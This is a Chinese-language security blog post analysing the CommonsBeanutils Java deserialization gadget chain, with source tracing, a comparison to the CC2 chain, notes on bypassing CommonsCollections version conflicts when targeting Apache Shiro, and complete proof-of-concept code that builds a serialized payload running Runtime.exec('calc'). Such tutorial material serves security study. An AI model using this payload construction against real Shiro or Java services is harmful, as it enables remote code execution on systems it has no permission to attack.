---
title: 代码审计 | CB链分析 —— CommonsBeanutils 反序列化利用链
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/ae5d8412cf7c09231d7128dfe41be18f-scaled.jpg
categories:
  - [代码审计, shiro]
tags:
  - 代码审计
  - Java
  - 反序列化
  - CB链
  - CommonsBeanutils
abbrlink: c4b8e2a3
date: 2026-04-06 21:00:00
---

## 目录

- [环境准备](#环境准备)
- [CB链的执行终点](#cb链的执行终点)
- [怎么触发 getOutputProperties()](#怎么触发-getoutputproperties)
- [跟源码](#跟源码)
- [入口：PriorityQueue](#入口priorityqueue)
- [CB 链 vs CC2 对比](#cb-链-vs-cc2-对比)
- [构造参数分析](#构造参数分析)
- [BeanComparator 构造方法的坑](#beancomparator-构造方法的坑)
- [add 占位的问题](#add-占位的问题)
- [POC](#poc)
- [补充](#补充)

---

## 环境准备

Maven 依赖：

```xml
<dependency>
    <groupId>commons-beanutils</groupId>
    <artifactId>commons-beanutils</artifactId>
    <version>1.9.2</version>
</dependency>
```

CB 链本身只需要 `commons-beanutils`，但 1.9.2 内部依赖了 CC，调试方便起见加上就行。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image1.png)

CB 链本身只需要 commons-beanutils，但 1.9.2 内部依赖了 CC

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image2.png)

（用 maven 下载源码才能搜到原代码）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image3.png)

JDK 8u65

---

## CB链的执行终点

CB 链还是用的 TemplatesImpl 加载恶意字节码，这点和之前的 CC 链一样。

之前用的都是 `TemplatesImpl.newTransformer()` 为起点，然后一路走下去：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image4.png)

```
TemplatesImpl.getOutputProperties() → getTransletInstance() → 恶意类.newInstance() → Runtime.exec()
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image5.png)

CB 链不再利用 `TemplatesImpl` 的 `newTransformer` 调用 `getOutputProperties` 方法，而是换了一种触发方式。

---

## 怎么触发 getOutputProperties()

核心在 `BeanComparator` 类的 `compare` 方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image6.png)

```java
Object value1 = PropertyUtils.getProperty( o1, property );
Object value2 = PropertyUtils.getProperty( o2, property );
```

`PropertyUtils.getProperty(obj, "outputProperties")` 内部用反射找到 `getOutputProperties()` 方法然后调用。

只要 o1 是 `TemplatesImpl` 对象，property 是 `"outputProperties"`，就能触发。

---

## 跟源码

简单跟一下调用链：

**compare**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image7.png)

**getProperty**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image8.png)

**getProperty（PropertyUtilsBean）**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image9.png)

**getNestedProperty**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image10.png)

**getSimpleProperty**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image11.png)

`invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY)` 就是反射调 getter，通过反射调用了 `getOutputProperties()`。

---

## 入口：PriorityQueue

`BeanComparator` 的 `compare` 方法签名：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image12.png)

```
compare( T o1, T o2 )
```

非常眼熟，正是 CC2 的 `PriorityQueue` 里面用的那套。

`PriorityQueue.readObject()` → `heapify()` → `siftDown()` → `siftDownUsingComparator()`，和 CC2 分析的是一样的。

**readObject**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image15.png)

**heapify**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image16.png)

**siftDown**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image17.png)

**siftDownUsingComparator**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image18.png)

`c` 和 `queue[right]` 都需要用到 `add` → `offer` 传入。

```java
Object c = queue[child];
int right = child + 1;
```

**add**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image19.png)

`offer` 就是写入数组的方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image20.png)

---

## CB 链 vs CC2 对比

回到 `BeanComparator` 的 `compare`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image12.png)

**补充对比：**

CC2 里的 `compare` 是 `TransformingComparator` 的，但 `TransformingComparator` 是有版本限制的——CC4 版本的 `TransformingComparator` 才继承了 `Serializable` 接口，可以被反序列化从而被利用。

`TransformingComparator` 是通过触发 `transform` 来触发反射达到目的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image13.png)

`BeanComparator` 是通过特殊的处理方式调用 getter，传入 `outputProperties` 触发 `getOutputProperties()`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image14.png)

这两个 `compare` 都能被 `PriorityQueue.readObject()` 调用，入口是一样的。

---

## 构造参数分析

回到核心问题，`PropertyUtils.getProperty(o1, property)` 需要：

- `o1` 传入 `TemplatesImpl` 对象
- `property` 需要是 `"outputProperties"`

这样就能触发 `TemplatesImpl` 的 `getOutputProperties()`。

`o1`、`o2` 和 CC2 一样，用 `add` 函数添加就行（不过直接添加在序列化时会被触发，所以后面需要用假的替一下，再反射换值）。

`property` 是用 `BeanComparator` 构造方法定义的，直接构造方法传入就行：

```java
new BeanComparator("outputProperties");
```

注意是小写 `o`，属性名规则是把 getter 方法 `getOutputProperties` 去掉 `get` 然后首字母小写。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image21.png)

---

## BeanComparator 构造方法的坑

`BeanComparator` 有两个构造方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image22.png)

区别就在于第二个参数 `comparator`，不填的话默认是 `ComparableComparator.getInstance()`。

`BeanComparator` 默认构造方法会调用 `ComparableComparator.getInstance()` 作为第二个参数，而 `ComparableComparator` 是 CC 包里的类。

本地环境有 CC 3.2.1，序列化反序列化都没问题。但打 Shiro 时，Shiro 自带 CC 4.0，两个版本 `ComparableComparator` 的 `serialVersionUID` 不一致，反序列化直接 `InvalidClassException`，payload 作废。

所以构造时显式传入 JDK 自带的 `String.CASE_INSENSITIVE_ORDER`：

```java
new BeanComparator("outputProperties", String.CASE_INSENSITIVE_ORDER);
```

`String.CASE_INSENSITIVE_ORDER` 是 JDK 自带的 `Comparator` 实现，不依赖任何第三方包。这样 payload 里完全没有 CC 的类，Shiro 环境下反序列化不会出任何版本冲突问题。

---

## add 占位的问题

先创建一个假链条（property 为 null），然后直接传入：

```java
queue.add(templates);
queue.add(templates);
```

再替换成真的 `outputProperties`，

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406210816691.png)

直接运行会报错：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image24.png)

`property` 是 null 时，`BeanComparator.compare()` 拿不到属性值，直接把对象本身丢给内部的 `ComparableComparator` 比较，`TemplatesImpl` 没实现 `Comparable`，还是炸。

所以根本原因不是 `property` 的值，是 **add 时传入的对象不能是 TemplatesImpl**，换成 `1` 占位就解决了。

先 `queue.add(1); queue.add(1);`，然后再反射赋值：

**为什么要两个相同元素**

`PriorityQueue` 在 `heapify()` 时会调用 `compare` 比较父子节点。两个相同对象（都是 `templates`）可以确保无论怎么比，都能触发 `getOutputProperties()`。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image25.png)

```java
Field f = PriorityQueue.class.getDeclaredField("queue");
f.setAccessible(true);
Object[] queueArr = (Object[]) f.get(queue);
queueArr[0] = templates;
queueArr[1] = templates;
```

`queue` 字段是个数组，不是普通字段，不能直接 `f.set(obj, value)` 替换整个数组，只能拿到数组引用之后按下标改元素。

---

## POC

```java
public class CB1 {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(fieldName);
        f.setAccessible(true);
        f.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // 1. 读取恶意字节码（EvilClass.class 需继承 AbstractTranslet）
        byte[] bytes = Files.readAllBytes(Paths.get("target\\classes\\org\\example\\EvilClass.class"));

        // 2. 构造 TemplatesImpl 对象并设置关键字段
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templates, "_name", "pwn");
        // 关键：必须设置 _tfactory，否则在高版本 JDK 中会因 null 抛出 NPE
        // setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 3. 构造 CB 链核心：BeanComparator
        // 设置 property 为触发 TemplatesImpl.getOutputProperties 的属性名
        // 打 Shiro 时用这个，避免 CC 版本冲突：
        // final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final BeanComparator comparator = new BeanComparator(null);

        // 4. 创建 PriorityQueue 并初始化占位数据
        // 注意：这里先用整数占位，因为后面需要反射修改
        final PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(1);

        // 5. 关键步骤：通过反射将 comparator 的 property 设置为 "outputProperties"
        setFieldValue(comparator, "property", "outputProperties");
        Field f = PriorityQueue.class.getDeclaredField("queue");
        f.setAccessible(true);
        Object[] queueArr = (Object[]) f.get(queue);
        queueArr[0] = templates;
        queueArr[1] = templates;

        // 6. 将最终构造好的队列序列化到 payload.ser 文件
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.ser"))) {
            oos.writeObject(queue);
        }
    }
}
```

```java
public class Deserialize {
    public static void main(String[] args) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("payload.ser"));
        ois.readObject();
        ois.close();
    }
}
```

```java
public class EvilClass extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```

**setFieldValue 解释**

```java
public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
    Field f = obj.getClass().getDeclaredField(fieldName);
    f.setAccessible(true);
    f.set(obj, value);
}
```

- `getDeclaredField(fieldName)` —— 拿到类里的字段，包括 private 的
- `setAccessible(true)` —— 去掉 private 限制
- `f.set(obj, value)` —— 把 obj 这个对象的这个字段值改成 value

相当于强行绕过 private 修饰符改字段值，之前 CC 链里一直在用这个。

**效果**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image26.png)

---

## 补充

### 1. `_tfactory` 字段的必要性

在 JDK 8u121 及之后，`TemplatesImpl` 的 `getTransletInstance()` 会检查 `_tfactory` 是否为 null，若为 null 会抛出 `NullPointerException`，导致无法实例化恶意类。因此高版本下必须反射设置 `_tfactory` 为一个 `TransformerFactoryImpl` 实例：

```java
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
```

CC2 篇详细讲过。

### 2. 为什么 EvilClass 必须继承 AbstractTranslet

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cb_image27.png)

---

## 总结

CB 链整体结构和 CC2 非常像，入口都是 `PriorityQueue`，执行终点都是 `TemplatesImpl`，核心区别就是中间那一环换掉了：

| | CC2 | CB |
|---|---|---|
| Comparator | `TransformingComparator` | `BeanComparator` |
| 触发方式 | `InvokerTransformer.transform()` 反射调 `newTransformer` | `PropertyUtils.getProperty()` 反射调 getter |
| 执行终点 | `TemplatesImpl.newTransformer()` | `TemplatesImpl.getOutputProperties()` |
| CC 依赖 | 需要 CC4 | 不需要 CC（打 Shiro 时无 CC 冲突问题） |

完整链路：

```
PriorityQueue.readObject()
→ heapify() → siftDown() → siftDownUsingComparator()
→ BeanComparator.compare()
→ PropertyUtils.getProperty(templatesImpl, "outputProperties")
→ TemplatesImpl.getOutputProperties()
→ _getTransletInstance()
→ 恶意类.newInstance()
→ Runtime.exec()
```

CB 链最大的价值在于打 Shiro，Shiro 自带 `commons-beanutils`，但 CC 版本对不上，用 CB 链 + `String.CASE_INSENSITIVE_ORDER` 彻底绕开 CC 依赖，是 Shiro 反序列化的标准打法。
